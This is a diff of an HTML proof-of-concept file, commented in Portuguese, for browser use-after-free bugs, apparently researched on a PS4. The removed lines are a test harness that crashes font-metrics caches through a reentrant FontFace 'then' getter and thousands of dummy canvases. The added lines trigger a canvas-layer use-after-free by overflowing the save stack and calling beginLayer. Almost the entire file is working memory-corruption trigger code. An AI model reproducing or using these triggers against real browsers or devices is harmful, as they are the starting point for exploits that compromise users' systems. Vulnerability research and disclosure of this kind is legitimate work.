@@ -1,185 +1,30 @@
+
 <!DOCTYPE html>
-<pre id="log"></pre>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>PoC - Canvas Layer UAF (e055837)</title>
+</head>
+<body>
 <script>
-// DESAMBIGUACAO: FontMetrics UAF (5ccd64b) vs UAF #2 GlyphGeometryCache (42b1e2a)
-//
-// Hipotese:
-//   Se B1 crasha SEM dummies → UAF #2 (ja reportado, mesma mecanica do 42b1e2a)
-//   Se B1 crasha SOMENTE COM dummies → FontMetrics UAF (5ccd64b, bug NOVO)
-//
-// Logica:
-//   UAF #2 (GlyphGeometryCache) nao precisa de dummies — ja confirmado com 0
-//   FontMetrics UAF precisa de pruneUnreferencedEntries durante width() → dummies
-//
-// INSTRUCAO: tirar foto assim que [EXECUTANDO] aparecer para cada teste.
-// O numero do ultimo teste visivel no estado EXECUTANDO = mecanismo confirmado.
+const canvas = document.createElement('canvas');
+canvas.width = 200;
+canvas.height = 200;
+canvas.style.cssText = 'position:absolute;left:-9999px';
+document.body.appendChild(canvas);
 
-var out = document.getElementById('log');
-var buf = '';
-function log(s) { buf += s + '\n'; out.textContent = buf; }
+const ctx = canvas.getContext('2d');
 
-var uid = 0;
-var dummyId = 0;
-var alive = [];
-
-function addDummies(n) {
-    for (var i = 0; i < n; i++) {
-        var d = document.createElement('canvas');
-        d.width = 1; d.height = 1;
-        d.getContext('2d').font = '10px "Z' + (dummyId++) + '"';
-        alive.push(d);
-    }
+// Estoura o limite de saves da pilha (MaxSaveCount)
+for (let i = 0; i < 20000; i++) {
+    ctx.save();
 }
 
-function makeCtx(font) {
-    var c = document.createElement('canvas');
-    c.width = 64; c.height = 64;
-    c.style.cssText = 'position:absolute;left:-9999px';
-    document.body.appendChild(c);
-    var ctx = c.getContext('2d');
-    ctx.font = font;
-    alive.push(c);
-    return ctx;
-}
-
-fetch('resources/Ahem.woff')
-    .then(function(r) { return r.arrayBuffer(); })
-    .then(function(b) {
-        return new Promise(function(res, rej) {
-            var fr = new FileReader();
-            fr.onload  = function(e) { res(e.target.result); };
-            fr.onerror = rej;
-            fr.readAsDataURL(new Blob([b], { type: 'font/woff' }));
-        });
-    })
-    .then(function(dataUrl) {
-
-    var tests = [
-
-    // ------------------------------------------------------------------
-    // Teste 1 — Times + Ahem(fallback) + Cherokee + 0 dummies
-    //
-    // Se CRASHAR: UAF #2 (GlyphGeometryCache) — mesmo mecanismo do 42b1e2a
-    //             dummies NAO sao necessarios → crash ja era do bug reportado
-    //
-    // Se PASSAR: getter nao dispara sem dummies (como A1 confirmou)
-    //            → dummies sao essenciais para o crash → segue para Teste 2
-    // ------------------------------------------------------------------
-    {
-        id: 1,
-        name: 'Times + Ahem(fallback) + Cherokee + 0 dummies',
-        result: 'Se crashar: UAF #2 (ja reportado). Se passar: dummies sao essenciais.',
-        dummies: 0
-    },
-
-    // ------------------------------------------------------------------
-    // Teste 2 — Times + Ahem(fallback) + Cherokee + 500 dummies
-    //
-    // Se CRASHAR: FontMetrics UAF dispara com < 1000 dummies no PS4
-    //             (threshold de pruneUnreferencedEntries pode ser menor)
-    //
-    // Se PASSAR: precisa de mais dummies → segue para Teste 3
-    // ------------------------------------------------------------------
-    {
-        id: 2,
-        name: 'Times + Ahem(fallback) + Cherokee + 500 dummies',
-        result: 'Se crashar: pruneUnreferencedEntries dispara com < 1000 entradas no PS4.',
-        dummies: 500
-    },
-
-    // ------------------------------------------------------------------
-    // Teste 3 — Times + Ahem(fallback) + Cherokee + 1200 dummies
-    //
-    // ESTE DEVE CRASHAR (confirmado em B1).
-    // Anchor de confirmacao: se passou tudo acima e este crasha,
-    // confirma que 1200 dummies e o minimo necessario para o FontMetrics UAF.
-    // ------------------------------------------------------------------
-    {
-        id: 3,
-        name: 'Times + Ahem(fallback) + Cherokee + 1200 dummies [CRASH ESPERADO]',
-        result: 'Confirmacao: B1 crashou com esta configuracao.',
-        dummies: 1200
-    },
-
-    // ------------------------------------------------------------------
-    // Teste 4 — Ancora: 2 faces MESMA familia + 0 dummies [CRASH ESPERADO]
-    // Padrao 42b1e2a original. Confirma que sessao ainda funciona.
-    // ------------------------------------------------------------------
-    {
-        id: 4,
-        name: '2 faces MESMA familia + 0 dummies [CRASH ESPERADO — ancora]',
-        result: 'Padrao 42b1e2a original. Deve crashar como referencia.',
-        dummies: 0,
-        isAnchor: true
-    }
-
-    ];
-
-    var idx = 0;
-    function next() {
-        if (idx >= tests.length) {
-            log('\n=== TODOS PASSARAM SEM CRASH ===');
-            return;
-        }
-        var t = tests[idx++];
-        log('--- Teste ' + t.id + ': ' + t.name);
-        log('    ' + t.result);
-
-        setTimeout(function() {
-            addDummies(t.dummies);
-            log('    [EXECUTANDO measureText...] <<< FOTO AQUI SE TRAVAR');
-            setTimeout(function() {
-
-                var id = uid++;
-
-                if (t.isAnchor) {
-                    // Padrao 42b1e2a: 2 faces mesma familia
-                    var f1 = new FontFace('CF' + id, 'url("' + dataUrl + '")');
-                    var f2 = new FontFace('CF' + id, 'url("' + dataUrl + '")');
-                    document.fonts.add(f1);
-                    document.fonts.add(f2);
-                    void f1.loaded; void f2.loaded;
-                    alive.push(f1, f2);
-                    var trap = function() {
-                        document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
-                    };
-                    Object.defineProperty(f1, 'then', { get: trap });
-                    Object.defineProperty(f2, 'then', { get: trap });
-                    var ctx = makeCtx('10px Times, CF' + id);
-                    ctx.measureText('\u13A0\u13A2\u13A4');
-
-                } else {
-                    // Padrao B1: Times(primary) + Ahem(fallback) + Cherokee
-                    var face = new FontFace('BF' + id, 'url("' + dataUrl + '")');
-                    document.fonts.add(face);
-                    void face.loaded;
-                    alive.push(face);
-                    var reen = false;
-                    Object.defineProperty(face, 'then', {
-                        configurable: true,
-                        get: function() {
-                            if (reen) return undefined;
-                            reen = true;
-                            document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
-                            reen = false;
-                            return undefined;
-                        }
-                    });
-                    var ctx = makeCtx('10px Times, BF' + id);
-                    ctx.measureText('\u13A0\u13A2\u13A4');
-                }
-
-                log('    PASSOU\n');
-                next();
-            }, 200);
-        }, 150);
-    }
-
-    log('=== DESAMBIGUACAO: FontMetrics UAF vs UAF #2 ===');
-    log('Ahem.woff OK. Tirar foto ao ver [EXECUTANDO] antes de cada crash.\n');
-    next();
-
-}).catch(function(e) {
-    document.getElementById('log').textContent = 'ERRO: ' + e.message;
-});
+// Dispara o beginLayer com a pilha travada no limite, 
+// forçando o cenário de early exit e o UAF de camadas.
+ctx.beginLayer();
+ctx.beginLayer();
+ctx.beginLayer();
 </script>
+</body>
+</html>
